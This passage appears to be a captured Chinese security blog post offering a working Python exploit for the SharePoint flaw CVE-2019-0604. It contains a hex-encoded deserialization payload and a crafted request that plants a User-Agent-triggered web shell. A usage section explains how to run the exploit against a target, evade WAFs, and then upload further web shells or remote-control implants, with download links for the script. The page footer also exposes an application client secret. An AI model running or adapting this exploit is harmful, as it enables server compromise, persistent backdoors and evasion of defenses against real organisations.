2\x36\x30\x30\x61\x36\x30\x30\x35\x36\x30\x30\x33\x36\x30\x30\x34\x37\x30\x30\x34\x34\x30\x30\x31\x36\x30\x30\x34\x37\x30\x30\x31\x36\x30\x30\x30\x35\x30\x30\x32\x37\x30\x30\x66\x36\x30\x30\x36\x37\x30\x30\x39\x36\x30\x30\x34\x36\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x65\x32\x30\x30\x64\x34\x30\x30\x35\x36\x30\x30\x34\x37\x30\x30\x38\x36\x30\x30\x66\x36\x30\x30\x34\x36\x30\x30\x30\x35\x30\x30\x31\x36\x30\x30\x32\x37\x30\x30\x31\x36\x30\x30\x64\x36\x30\x30\x35\x36\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x33\x37\x30\x30\x36\x32\x30\x30\x37\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x64\x30\x30\x30\x61\x30\x30\x30\x39\x30\x30\x30\x39\x30\x30\x30\x39\x30\x30\x30\x36\x32\x30\x30\x63\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x33\x35\x30\x30\x39\x37\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x61\x33\x30\x30\x33\x35\x30\x30\x34\x37\x30\x30\x32\x37\x30\x30\x39\x36\x30\x30\x65\x36\x30\x30\x37\x36\x30\x30\x36\x32\x30\x30\x37\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x33\x36\x30\x30\x64\x36\x30\x30\x34\x36\x30\x30\x36\x32\x30\x30\x63\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x66\x32\x30\x30\x33\x35\x30\x30\x39\x37\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x61\x33\x30\x30\x33\x35\x30\x30\x34\x37\x30\x30\x32\x37\x30\x30\x39\x36\x30\x30\x65\x36\x30\x30\x37\x36\x30\x30\x36\x32\x30\x30\x37\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x64\x30\x30\x30\x61\x30\x30\x30\x39\x30\x30\x30\x39\x30\x30\x30\x39\x30\x30\x30\x36\x32\x30\x30\x63\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x33\x35\x30\x30\x39\x37\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x61\x33\x30\x30\x33\x35\x30\x30\x34\x37\x30\x30\x32\x37\x30\x30\x39\x36\x30\x30\x65\x36\x30\x30\x37\x36\x30\x30\x36\x32\x30\x30\x37\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x66\x32\x30\x30\x33\x36\x30\x30\x30\x32\x30\x30\x35\x36\x30\x30\x33\x36\x30\x30\x38\x36\x30\x30\x66\x36\x30\x30\x30\x32\x30\x30\x65\x35\x30\x30\x36\x32\x30\x30\x31\x36\x30\x30\x64\x36\x30\x30\x30\x37\x30\x30\x62\x33\x30\x30\x63\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x35\x32\x30\x30\x30\x34\x30\x30\x30\x32\x30\x30\x30\x35\x30\x30\x31\x36\x30\x30\x37\x36\x30\x30\x35\x36\x30\x30\x30\x32\x30\x30\x63\x34\x30\x30\x31\x36\x30\x30\x65\x36\x30\x30\x37\x36\x30\x30\x35\x37\x30\x30\x31\x36\x30\x30\x37\x36\x30\x30\x35\x36\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x61\x34\x30\x30\x33\x37\x30\x30\x33\x36\x30\x30\x32\x37\x30\x30\x39\x36\x30\x30\x30\x37\x30\x30\x34\x37\x30\x30\x32\x32\x30\x30\x30\x32\x30\x30\x35\x32\x30\x30\x65\x35\x30\x30\x36\x32\x30\x30\x37\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x65\x35\x30\x30\x36\x32\x30\x30\x31\x36\x30\x30\x64\x36\x30\x30\x30\x37\x30\x30\x62\x33\x30\x30\x63\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x35\x32\x30\x30\x36\x37\x30\x30\x31\x36\x30\x30\x32\x37\x30\x30\x30\x32\x30\x30\x30\x37\x30\x30\x37\x37\x30\x30\x34\x36\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x34\x37\x30\x30\x66\x36\x30\x30\x64\x36\x30\x30\x32\x32\x30\x30\x62\x33\x30\x30\x36\x37\x30\x30\x31\x36\x30\x30\x32\x37\x30\x30\x30\x32\x30\x30\x35\x37\x30\x30\x31\x36\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x32\x37\x30\x30\x64\x33\x30\x30\x32\x35\x30\x30\x35\x36\x30\x30\x31\x37\x30\x30\x35\x37\x30\x30\x35\x36\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x65\x32\x30\x30\x35\x35\x30\x30\x33\x37\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x31\x34\x30\x30\x37\x36\x30\x30\x35\x36\x30\x30\x65\x36\x30\x30\x34\x37\x30\x30\x62\x33\x30\x30\x39\x36\x30\x30\x36\x36\x30\x30\x30\x32\x30\x30\x38\x32\x30\x30\x35\x37\x30\x30\x31\x36\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x32\x37\x30\x30\x65\x32\x30\x30\x33\x35\x30\x30\x35\x37\x30\x30\x32\x36\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x32\x37\x30\x30\x39\x36\x30\x30\x65\x36\x30\x30\x37\x36\x30\x30\x38\x32\x30\x30\x30\x33\x30\x30\x63\x32\x30\x30\x30\x32\x30\x30\x35\x37\x30\x30\x31\x36\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x32\x37\x30\x30\x65\x32\x30\x30\x39\x34\x30\x30\x65\x36\x30\x30\x34\x36\x30\x30\x35\x36\x30\x30\x38\x37\x30\x30\x66\x34\x30\x30\x36\x36\x30\x30\x38\x32\x30\x30\x32\x32\x30\x30\x64\x33\x30\x30\x64\x33\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x39\x32\x30\x30\x39\x32\x30\x30\x64\x33\x30\x30\x64\x33\x30\x30\x30\x32\x30\x30\x30\x37\x30\x30\x37\x37\x30\x30\x34\x36\x30\x30\x39\x32\x30\x30\x30\x32\x30\x30\x62\x37\x30\x30\x36\x37\x30\x30\x31\x36\x30\x30\x32\x37\x30\x30\x30\x32\x30\x30\x33\x36\x30\x30\x66\x36\x30\x30\x34\x36\x30\x30\x35\x36\x30\x30\x64\x33\x30\x30\x35\x37\x30\x30\x31\x36\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x32\x37\x30'
+payload4='\x74\x6F\x6D\x3D\x3D\x3D\x52\x65\x73\x70\x6F\x6E\x73\x65\x2E\x57\x72\x69\x74\x65\x28\x22\x55\x41\x73\x68\x65\x6C\x6C\x22\x29\x3B'
+payload5='\x23\x64\x61\x74\x65\x3A\x20\x32\x30\x31\x39\x30\x36\x32\x36\x20\x23\x61\x75\x74\x68\x6F\x72\x3A\x20\x6B\x38\x67\x65\x67\x65'
+<p>values = {‘__REQUESTDIGEST’:‘0xF4545A48FA093FD290D386F2E317C72EF439C05EABDC8BDF0D81022DAEFE10FF6D4782A17836870BB0EBF673E71DCD6F7E631A1371319881902FDEF3032A16F4,18 Jun 2019 16:41:35 -0000’,<br>
+‘__EVENTTARGET’:‘’,<br>
+‘__EVENTARGUMENT’:‘’,<br>
+‘__spPickerHasReturnValue’:‘’,<br>
+‘__spPickerReturnValueHolder’:‘’,<br>
+‘__VIEWSTATE’:‘/wEPDwULLTIwNTYyMzI3OTQPZBYCZg9kFgQCBQ9kFgICBQ9kFgJmD2QWAgIBD2QWAmYPFgIeBFRleHQFBlBpY2tlcmQCCQ9kFgICBw9kFgwCAw9kFgJmDxYEHgxFcnJvck1lc3NhZ2VlHgtIdG1sTWVzc2FnZQVpPHNwYW4gY2xhc3M9Im1zLWVycm9yIj5BbiBlcnJvciBvY2N1cnJlZC4gQWRtaW5pc3RyYXRvcnMsIHNlZSB0aGUgc2VydmVyIGxvZyBmb3IgbW9yZSBpbmZvcm1hdGlvbi48L3NwYW4+ZAIFD2QWAmYPZBYCZg9kFgJmD2QWAgIBD2QWAmYPDxYCHwBlFgIeCW9ua2V5ZG93bgW1AXZhciBlPWV2ZW50OyBpZighZSkgZT13aW5kb3cuZXZlbnQ7IGlmKCFicm93c2VyaXMuc2FmYXJpICYmIGUua2V5Q29kZT09MTMpIHsgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2N0bDAwX1BsYWNlSG9sZGVyRGlhbG9nQm9keVNlY3Rpb25fY3RsMDdfcXVlcnlCdXR0b24nKS5jbGljaygpOyByZXR1cm4gZmFsc2U7IH1kAgcPZBYCZg8PFgIfAAVpPHNwYW4gY2xhc3M9Im1zLWVycm9yIj5BbiBlcnJvciBvY2N1cnJlZC4gQWRtaW5pc3RyYXRvcnMsIHNlZSB0aGUgc2VydmVyIGxvZyBmb3IgbW9yZSBpbmZvcm1hdGlvbi48L3NwYW4+ZGQCCQ9kFgJmDw8WAh8AZWRkAgsPZBYCZg8PFgIeEkNPTFVNTkRJU1BMQVlOQU1FUxYAZGQCDQ9kFgICAQ9kFgQCAQ8WAh4FdmFsdWUFBkFkZCAtPmQCAw9kFgJmDw8WCh4OQ1VTVE9NUFJPUEVSVFllHgVXaWR0aBsAAAAAAABZQAcAAAAeCUlTQ0hBTkdFRGgeBF8hU0ICgAIeDEVuYWJsZUJyb3dzZWgWGB4OZWRpdG9yT2xkVmFsdWVlHgpSZW1vdmVUZXh0BQZSZW1vdmUfBWUeDU5vTWF0Y2hlc1RleHQFEU5vIE1hdGNoaW5nIEl0ZW1zHgphbGxvd0VtcHR5BQExHg1Nb3JlSXRlbXNUZXh0BQ1Nb3JlIEl0ZW1zLi4uHhhwcmVmZXJDb250ZW50RWRpdGFibGVEaXYFBHRydWUeHXNob3dEYXRhVmFsaWRhdGlvbkVycm9yQm9yZGVyBQVmYWxzZR4LYWxsb3dUeXBlSW4FBWZhbHNlHgppblZhbGlkYXRlBQVmYWxzZR4bRUVBZnRlckNhbGxiYWNrQ2xpZW50U2NyaXB0ZR4eU2hvd0VudGl0eURpc3BsYXlUZXh0SW5UZXh0Qm94BQEwFgICBA8PFgYfBxsAAAAAAABZQAcAAAAeCENzc0NsYXNzBQ1tcy11c2VyZWRpdG9yHwkCggJkFgRmDw8WBB4NVmVydGljYWxBbGlnbgsqJ1N5c3RlbS5XZWIuVUkuV2ViQ29udHJvbHMuVmVydGljYWxBbGlnbgMfCQKAgAhkFgJmD2QWAmYPZBYCZg9kFgJmD2QWBGYPFigeCHRhYmluZGV4BQEwHgdvbmZvY3VzBbEBU3RvcmVPbGRWYWx1ZSgnY3RsMDBfUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbl9jdGwwNScpOyBzYXZlT2xkRW50aXRpZXMoJ2N0bDAwX1BsYWNlSG9sZGVyRGlhbG9nQm9keVNlY3Rpb25fY3RsMDUnKTsgU3lzLlVJLkRvbUVsZW1lbnQuYWRkQ3NzQ2xhc3ModGhpcywgJ21zLWlucHV0Qm94QWN0aXZlJyk7Hg5hcmlhLW11bHRpbGluZQUEdHJ1ZR4Gb25ibHVyBYEDaWYodHlwZW9mKEV4dGVybmFsQ3VzdG9tQ29udHJvbENhbGxiYWNrKT09J2Z1bmN0aW9uJyl7IGlmKFNob3VsZENhbGxDdXN0b21DYWxsQmFjaygnY3RsMDBfUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbl9jdGwwNScsZXZlbnQpKXtpZighVmFsaWRhdGVQaWNrZXJDb250cm9sKCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1Jykpe1Nob3dWYWxpZGF0aW9uRXJyb3IoKTtyZXR1cm4gZmFsc2U7fWVsc2Uge0V4dGVybmFsQ3VzdG9tQ29udHJvbENhbGxiYWNrKCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1Jyk7fX19IFN5cy5VSS5Eb21FbGVtZW50LnJlbW92ZUNzc0NsYXNzKHRoaXMsICdtcy1pbnB1dEJveEFjdGl2ZScpOx4Hb25jbGljawVHb25DbGlja1J3KHRydWUsIHRydWUsZXZlbnQsJ2N0bDAwX1BsYWNlSG9sZGVyRGlhbG9nQm9keVNlY3Rpb25fY3RsMDUnKTseCG9uY2hhbmdlBT91cGRhdGVDb250cm9sVmFsdWUoJ2N0bDAwX1BsYWNlSG9sZGVyRGlhbG9nQm9keVNlY3Rpb25fY3RsMDUnKTseB29uUGFzdGUFOmRvcGFzdGUoJ2N0bDAwX1BsYWNlSG9sZGVyRGlhbG9nQm9keVNlY3Rpb25fY3RsMDUnLGV2ZW50KTsfEAUEdHJ1ZR4MQXV0b1Bvc3RCYWNrBQEwHgRyb3dzBQExHgtvbkRyYWdTdGFydAUOY2FuRXZ0KGV2ZW50KTseB29ua2V5dXAFPXJldHVybiBvbktleVVwUncoJ2N0bDAwX1BsYWNlSG9sZGVyRGlhbG9nQm9keVNlY3Rpb25fY3RsMDUnKTseBm9uQ29weQU5ZG9jb3B5KCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1JyxldmVudCk7HgV0aXRsZQUURXh0ZXJuYWwgSXRlbSBQaWNrZXIfAwVQcmV0dXJuIG9uS2V5RG93blJ3KCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1JywgMywgZmFsc2UsIGV2ZW50KTseCnNwZWxsY2hlY2sFBWZhbHNlHg9jb250ZW50RWRpdGFibGUFBHRydWUeDWFyaWEtaGFzcG9wdXAFBHRydWUeBXN0eWxlBTp3b3JkLXdyYXA6IGJyZWFrLXdvcmQ7b3ZlcmZsb3cteDogaGlkZGVuO292ZXJmbG93LXk6IGF1dG87HgRyb2xlBQd0ZXh0Ym94ZAIBDw8WCh4IVGFiSW5kZXgBAAAfBxsAAAAAAABZQAcAAAAeBFJvd3MCAR8faB8JAoACFhIfGQWxAVN0b3JlT2xkVmFsdWUoJ2N0bDAwX1BsYWNlSG9sZGVyRGlhbG9nQm9keVNlY3Rpb25fY3RsMDUnKTsgc2F2ZU9sZEVudGl0aWVzKCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1Jyk7IFN5cy5VSS5Eb21FbGVtZW50LmFkZENzc0NsYXNzKHRoaXMsICdtcy1pbnB1dEJveEFjdGl2ZScpOx8iBT1yZXR1cm4gb25LZXlVcFJ3KCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1Jyk7HyQFFEV4dGVybmFsIEl0ZW0gUGlja2VyHx0FP3VwZGF0ZUNvbnRyb2xWYWx1ZSgnY3RsMDBfUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbl9jdGwwNScpOx8bBYEDaWYodHlwZW9mKEV4dGVybmFsQ3VzdG9tQ29udHJvbENhbGxiYWNrKT09J2Z1bmN0aW9uJyl7IGlmKFNob3VsZENhbGxDdXN0b21DYWxsQmFjaygnY3RsMDBfUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbl9jdGwwNScsZXZlbnQpKXtpZighVmFsaWRhdGVQaWNrZXJDb250cm9sKCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1Jykpe1Nob3dWYWxpZGF0aW9uRXJyb3IoKTtyZXR1cm4gZmFsc2U7fWVsc2Uge0V4dGVybmFsQ3VzdG9tQ29udHJvbENhbGxiYWNrKCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1Jyk7fX19IFN5cy5VSS5Eb21FbGVtZW50LnJlbW92ZUNzc0NsYXNzKHRoaXMsICdtcy1pbnB1dEJveEFjdGl2ZScpOx8oBSJkaXNwbGF5OiBub25lO3Bvc2l0aW9uOiBhYnNvbHV0ZTsgHwMFUHJldHVybiBvbktleURvd25SdygnY3RsMDBfUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbl9jdGwwNScsIDMsIGZhbHNlLCBldmVudCk7Hx8FATAeGnJlbmRlckFzQ29udGVudEVkaXRhYmxlRGl2BQR0cnVlZAICDw8WAh4HVmlzaWJsZWhkZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAgU0Y3RsMDAkUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbiRjdGwwNyRxdWVyeUJ1dHRvbgUoY3RsMDAkUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbiRjdGwwNVdO0+ZP+kKR1gMQud0zVHpuy8sqq7e4YSOgfg1USdFj’,<br>
+‘__VIEWSTATEGENERATOR’:‘A123E449’,<br>
+ct1+paySection+‘$ctl07$queryTextBox’:‘’,<br>
+paySpanData:payload1+‘4700440016004700160005002700f60067009600460056002700c200020005002700560037005600e6004700160047009600f600e600640027001600d60056007700f6002700b600c200020065005600270037009600f600e600d3004300e2000300e2000300e2000300c200020034005700c6004700570027005600d300e60056005700470027001600c600c2000200050057002600c60096003600b400560097004500f600b6005600e600d3003300130026006600330083005300630016004600330063004300560033005300d500d500c200020035009700370047005600d600e2004400160047001600e20035005600270067009600360056003700c200020065005600270037009600f600e600d3004300e2000300e2000300e2000300c200020034005700c6004700570027005600d300e60056005700470027001600c600c2000200050057002600c60096003600b400560097004500f600b6005600e600d3002600730073001600530036005300630013009300330043005600030083009300a300c300f300’+payload2+‘5600c300f200d400560047008600f6004600e4001600d6005600e300d000a0000200020002000200c300d400560047008600f60046000500160027001600d60056004700560027003700e300d000a000020002000200020002000200c3001600e600970045009700070056000200870037009600a3004700970007005600d3002200870037004600a3003700470027009600e60076002200e3006200c6004700b300250056003700f600570027003600560044009600360047009600f600e600160027009700d000a0008700d600c600e6003700d30022008600470047000700a300f200f2003700360086005600d60016003700e200d600960036002700f6003700f60066004700e2003600f600d600f20077009600e60066008700f2002300030003006300f20087001600d600c600f20007002700560037005600e6004700160047009600f600e6002200d000a0008700d600c600e6003700a3008700d30022008600470047000700a300f200f2003700360086005600d60016003700e200d600960036002700f6003700f60066004700e2003600f600d600f20077009600e60066008700f2002300030003006300f20087001600d600c6002200d000a0008700d600c600e6003700a30035009700370047005600d600d30022003600c6002700d200e6001600d600560037000700160036005600’+payload3+‘0e200250056000700c6001600360056008200070077004600b2002200d300d300d3002200c200220022009200b300560067001600c60082003600f60046005600c20022005700e600370016006600560022009200b3000200d700b3005200e500620076004700b3000200620076004700b3000200220052003400f600d600d600f600e60005002700f600760027001600d60064009600c600560037005200c500d400960036002700f6003700f600660047000200350086001600270056004600c500750056002600020035005600270067005600270002005400870047005600e60037009600f600e6003700c50013005300c50045005400d4000500c400140045005400c500c40014009500f400550045003500c50057001600e2001600370007008700220002006200c6004700b300f20035009700370047005600d600a3003500470027009600e6007600620076004700b300d000a000900090006200c6004700b300f200f4002600a600560036004700440016004700160005002700f60067009600460056002700e200d400560047008600f60046000500160027001600d60056004700560027003700620076004700b300d000a00090006200c6004700b300f200f4002600a600560036004700440016004700160005002700f60067009600460056002700620076004700b300d000a0006200c6004700b300f200250056003700f600570027003600560044009600360047009600f600e600160027009700620076004700b300d000a000c300f2001600e60097004500970007005600e300d000a0000200020002000200c300f200d400560047008600f60046000500160027001600d60056004700560027003700e300d000a00002000200c300f20005002700f600a6005600360047005600460005002700f600070056002700470097000300e300d000a000c300f2005400870007001600e6004600560046007500270016000700070056002700f400660085001600d600c600250056001600460056002700f4002600a600560036004700440016004700160005002700f60067009600460056002700e300’,<br>
+ct1+paySection+ct2+‘$OriginalEntities’:‘&lt;Entities /&gt;’,<br>
+ct1+paySection+ct2+‘$HiddenEntityKey’:‘’,<br>
+ct1+paySection+ct2+‘$HiddenEntityDisplayText’:‘’,<br>
+ct1+paySection+ct2+‘$downlevelTextBox’:’&nbsp;‘,<br>
+‘__CALLBACKID’:ct1+paySection+’$ctl07’,<br>
+‘__CALLBACKPARAM’:‘;#;#11;#;#;#’,<br>
+‘__EVENTVALIDATION’:‘/wEdAArGxMN0ZJ7K9w5zktdyYEhBD0ElpjQ1qya+g3gJn5tj2kGdpzwPwReE9qIrxAfsdm2iW+aWbiEcyxsYaScsTlQ450VsGNyXdI9EVzK0gDisZ5XfOLdqAfYHRFskSc14VkFc8gJL9PF80m6F3xAWwiF2sOBSyZzTvibJdZIQ6/yiluhmzA7nAUttaM/XaeAk14GgLvO2vw2Ax/oUZshBCs1rvRIjfjnjQxx1nrwDNJpAlG8icRe2xKLDvCGTmWjcu2A=’}</p>
+<p>data = urllib.urlencode(values)<br>
+req = urllib2.Request(url+spver, data)<br>
+response = urllib2.urlopen(req)<br>
+the_page = response.read()<br>
+print exp+‘\n’+payload5<br>
+print the_page</p>
+<p>headers = {<br>
+“Accept”: “text/html,application/xhtml+xml,application/xml;q=0.9,<a href="https://www.cnblogs.com/k8gege" target="_blank">image</a>/webp,image/apng,<em>/</em>;q=0.8”,<br>
+“Accept-Language”: “en”,<br>
+“Cache-Control”: “max-age=0”,<br>
+“Connection”: “keep-alive”,<br>
+“Cookie”: “PHPSESSID=m2hbrvp548cg6v4ssp0l35kcj7; _ga=GA1.2.2052701472.1532920469; _gid=GA1.2.1351314954.1532920469; __atuvc=3%7C31; __atuvs=5b5e9a0418f6420c001”,<br>
+#“User-Agent”: “Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36”,<br>
+“Upgrade-Insecure-Requests”: “1”,<br>
+uapay: payload4,<br>
+}</p>
+<p>data = {“__CALLBACKID”: “”,<br>
+“__VIEWSTATE”: “”,<br>
+‘ctl00$’+paySection+‘$’: “”,<br>
+“__CALLBACKID”: “All”,<br>
+“__CALLBACKPARAM”: “”}</p>
+<p>response = requests.get(shellurl, headers=headers, timeout=5)<br>
+if response.content==‘UAshell’:<br>
+print 'UAshell: '+shellurl<br>
+</p></pre><p></p>
+</div>
+<p>&nbsp;</p>
+<p><span style="font-size: 18px;"><strong>实战:</strong></span></p>
+<p><span style="font-size: 16px;">python cve-2019-0604-exp.py&nbsp;http://<a href="http://k8gege.github.io" target="_blank">k8gege.github.io</a></span></p>
+<p><span style="font-size: 16px;">若成功返回WebShell地址</span></p>
+<p><img alt="" data-original="http://k8gege.org/k8img/posts/CVE-2019-0604_1.png"></p>
+<p><span style="font-size: 16px;">UAshell访问报错，大家不要慌，原本设计就是这样子</span></p>
+<p><img alt="" data-original="http://k8gege.org/k8img/posts/CVE-2019-0604_2.png"></p>
+<p><span style="font-size: 16px;">使用K8飞刀CMD连接，当然你可以通过CMD下载其它的WebShell过去管理</span></p>
+<p><span style="font-size: 16px;">比如菜刀,因为飞刀UA系列的WebShell除了过WAF，均无文件管理功能</span></p>
+<p><span style="font-size: 16px;">使用UA而不使用菜刀一句话，是因为菜刀一句话都是POST，容易被WAF拦截</span></p>
+<p><span style="font-size: 16px;">当然你传过去后发现目标无WAF或无杀软，再传其它Webshell或植入远控都可以</span></p>
+<p><img alt="" data-original="http://k8gege.org/k8img/posts/CVE-2019-0604_3.png"></p>
+<p>&nbsp;</p>
+<p><span style="font-size: 18px; color: #ff00ff;"><strong>下载：</strong></span></p>
+<p>&nbsp;<a href="https://github.com/k8gege/CVE-2019-0604" target="_blank">https://github.com/k8gege/CVE-2019-0604</a></p>
+<p><a href="https://github.com/k8gege/K8tools/raw/master/cve-2019-0604-exp.py" target="_blank">&nbsp;https://github.com/k8gege/K8tools/raw/master/cve-2019-0604-exp.py</a></p>
+
+    </div>
+    
+    <div class="reward" ontouchstart="">
+    <div class="reward-wrap">
+	<img height="180" width="180" data-original="../images/k8join2.png">
+
+    </div>
+    <p class="reward-tip">
+        扫码加入K8小密圈
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="http://k8gege.org" target="_blank">K8gege</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/p/68a8bf1b.html" class="pre-post btn btn-default" title="SMB溢出工具加强版">
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            SMB溢出工具加强版</span>
+    </a>
+    
+    
+    <a href="/p/19452dd9.html" class="next-post btn btn-default" title="CVE-2019-9621 Zimbra<8.8.11 GetShell Exploit">
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            CVE-2019-9621 Zimbra&lt;8.8.11 GetShell Exploit</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<link rel="stylesheet" href="https://cdn.bootcss.com/gitalk/1.4.1/gitalk.min.css">
+<script src="//cdn.bootcss.com/gitalk/1.4.1/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.9.0/js/md5.min.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+var gitalk = new Gitalk({
+    // Gitalk配置
+    language: "en",
+    clientID: "b2247720d5b50a30fbe7",
+    clientSecret: "fbd720b7c84bea4de2ac3bef40b37509ccca0267",
+    repo: "k8gege.github.io",
+    owner: "k8gege",
+    admin: ["k8gege"],
+    id: md5(location.pathname),
+    distractionFreeMode: true
+});
+gitalk.render('gitalk-container');
+</script>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            Table of Contents
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#h2-2"><span class="toc-text">攻击入口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#h2-3"><span class="toc-text">PoC</span></a></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0f0409af9df7ad2cc43cc334b4d9b515";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+ <script type="text/javascript" src="http://libs.baidu.com/jquery/1.11.1/jquery.min.js"></script>
+ <script src="https://cdn.bootcdn.net/ajax/libs/lazysizes/5.3.2/lazysizes.min.js" async=""></script>
+
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    Total:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+	<!-- 
+    &nbsp; | &nbsp;
+    
+	Visitors:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i> 
+    </strong>
+	-->
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright ©
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//k8gege.org" class="copyright-links" target="_blank" rel="nofollow">K8gege</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+</body></html>
